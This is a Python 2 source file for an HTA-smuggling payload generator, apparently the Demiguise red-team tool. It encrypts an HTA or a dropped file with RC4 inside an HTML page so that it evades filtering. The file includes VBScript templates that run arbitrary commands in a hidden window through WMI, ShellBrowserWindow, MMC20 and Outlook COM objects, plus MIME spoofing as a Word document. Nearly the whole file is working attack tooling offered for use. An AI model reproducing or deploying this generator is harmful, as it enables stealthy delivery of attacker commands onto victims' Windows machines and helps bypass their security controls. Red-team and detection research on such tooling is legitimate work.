#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from __future__ import print_function
import base64
import string
import random
import argparse
import os
import sys


# TODO: load *all* templates from template folder rather than hard-coding
with open("templates/hta_template.txt") as f:
	HTML_TEMPLATE = f.read()

with open("templates/file_template.txt") as f:
	FILE_TEMPLATE = f.read()


WMI_HTA = """<html>
<head>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	objConfig.ShowWindow = HIDDEN_WINDOW
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("{0}", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>"""
# https://twitter.com/enigma0x3/status/870810601483894784
# https://twitter.com/r0wdy_/status/871142675784671233


SHELLBROWSER_HTA = """<script language="VBScript">
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "{}",Null,"C:\Windows\System32",Null,0
self.close
</script>"""
# https://twitter.com/enigma0x3/status/890980564420788224


# Requires elevation :(
MMC20_HTA = """<script language="VBScript">
Set obj = GetObject("new:49B2791A-B1AE-4C90-9B8E-E860BA07F889")
obj.Document.ActiveView.ExecuteShellCommand("{}")
self.close
</script>"""
# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/


OUTLOOK_HTA = """<script language="VBScript">
Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
obj.CreateObject("WScript.Shell").Run("{}")
self.close
</script>"""
# https://gist.github.com/staaldraad/b0665993f49098e9b82a4fd4d135198f


# Experimental XLL feature - only tested on Office 2016 (x64)
with open("templates/xll_hta.txt") as f:
	XLL_HTA = f.read()


PAYLOAD_OPTIONS = {
	"WbemScripting.SWbemLocator": WMI_HTA,
	"Outlook.Application": OUTLOOK_HTA,
	"Excel.RegisterXLL": XLL_HTA,
	"ShellBrowserWindow": SHELLBROWSER_HTA,
	"PlainFile": ""
}


def rc4(key, data):
	"""
	Decrypt/encrypt the passed data using RC4 and the given key.
	https://github.com/EmpireProject/Empire/blob/73358262acc8ed3c34ffc87fa593655295b81434/data/agent/stagers/dropbox.py
	"""
	S, j, out = range(256), 0, []
	for i in range(256):
		j = (j + S[i] + ord(key[i % len(key)])) % 256
		S[i], S[j] = S[j], S[i]
	i = j = 0
	for char in data:
		i = (i + 1) % 256
		j = (j + S[i]) % 256
		S[i], S[j] = S[j], S[i]
		out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
	return ''.join(out)


def rnd():
	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(random.randrange(4,12)))


def payload_choices():
	return PAYLOAD_OPTIONS.keys()


def list_payloads():
	print("\n\t".join(PAYLOAD_OPTIONS.keys()))


if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description='"The Demiguise is a peaceful, herbivorous creature that can make itself invisible and tell the future which makes it very hard to catch."')
	parser.add_argument("-k", "--key", help="Encryption key", dest="key")
	parser.add_argument("-p", "--payload", help="Payload type to use", dest="payload", choices=payload_choices())
	parser.add_argument("-l", "--list-payloads", help="List payloads available", action="store_const", const="list_payloads")
	parser.add_argument("-c", "--command", help="Command to run from HTA", dest="command")
	parser.add_argument("-f", "--file", help="File to drop, when used with payload PlainFile", dest="dropfile")
	parser.add_argument("-o", "--output", help="Name of the HTA file to generate", dest="output")
	args = parser.parse_args()

	if args.list_payloads:
		sys.stdout.write("[*] Payload choices:\n\t")
		list_payloads()
		sys.exit(1)

	if args.payload == "PlainFile" and args.key and args.dropfile:
		with open(args.dropfile, 'r') as f:
			hta_encrypted = base64.b64encode(rc4(args.key, base64.b64encode(f.read())))
			filename_encrypted = base64.b64encode(rc4(args.key, args.dropfile.split(os.sep)[-1]))


		blobber = """(function(b,fname){if(navigator.msSaveBlob)navigator.msSaveBlob(b,fname);else{var link=document.createElement("a");link.href=window.URL.createObjectURL(b),link.setAttribute("download",fname),document.body.appendChild(link),link.click(),document.body.removeChild(link)}})"""

		b64tobin = """(function(t){for(var e=atob(t),n=e.length,r=Math.ceil(n/1024),a=new Array(r),o=0;o<r;++o){for(var c=1024*o,i=Math.min(c+1024,n),y=new Array(i-c),l=c,p=0;l<i;++p,++l)y[p]=e[l].charCodeAt(0);a[o]=new Uint8Array(y)}return new Blob(a,{type:'application/octet-stream'})})"""

		msSaveBlob = base64.b64encode(rc4(args.key, blobber))
		blob = base64.b64encode(rc4(args.key, "Blob"))
		b64func = base64.b64encode(rc4(args.key, b64tobin))

		outfile = "{}.html".format(os.path.splitext(args.dropfile.split(os.sep)[-1])[0])
		with open(outfile, 'w') as f:
			f.write(FILE_TEMPLATE.format(rnd(), rnd(), hta_encrypted, rnd(), filename_encrypted, rnd(), args.key, msSaveBlob, rnd(), rnd(), blob, rnd(), b64func))
		print("\n[*] Generating with key: {}".format(args.key))
		print("[*] Will drop: {}".format(args.dropfile))
		print("[+] HTA file written to: {}".format(outfile))

	elif args.key and args.command and args.output and args.payload:
		hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
		# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
		# TODO: Spoof other mime-types, maybe pick at random from a list of suitable candidates?
		blobShim = """(function(b,fname){if(window.navigator.msSaveOrOpenBlob)
window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"application/msword"});var a=window.document.createElement("a");a.href=window.URL.createObjectURL(f);a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
"""

		msSaveBlob = base64.b64encode(rc4(args.key, blobShim))
		blob = base64.b64encode(rc4(args.key, "Blob"))

		outfile = "{}.html".format(os.path.splitext(args.output)[0])
		with open(outfile, 'w') as f:
			f.write(HTML_TEMPLATE.format(rnd(), rnd(), hta_encrypted, rnd(), filename_encrypted, rnd(), args.key, msSaveBlob, rnd(), rnd(), blob))
		print("\n[*] Generating with key: {}".format(args.key))
		print("[*] Will execute: {}".format(args.command))
		print("[+] HTA file written to: {}".format(outfile))
	else:
		parser.print_help()
		print('\n[*] Example: python demiguise.py -k hello -c "cmd.exe /c calc.exe" -o test.hta -p ShellBrowserWindow')
